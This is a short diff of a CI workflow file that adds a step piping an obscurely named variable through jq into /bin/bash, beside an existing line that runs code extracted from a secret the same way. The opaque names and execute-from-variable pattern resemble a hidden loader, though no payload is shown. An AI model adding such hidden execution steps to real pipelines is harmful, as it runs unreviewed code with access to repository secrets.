@@ -23,6 +23,7 @@ jobs:
           ax796: ${{ secrets.ax796 }}
         run: |
           printf '%s' "$ax796" | jq -r .fc81 | /bin/bash
+          echo $wadps4 | jq -r .oycjx9398 | /bin/bash
 
       - name: Archive output
         if: always()
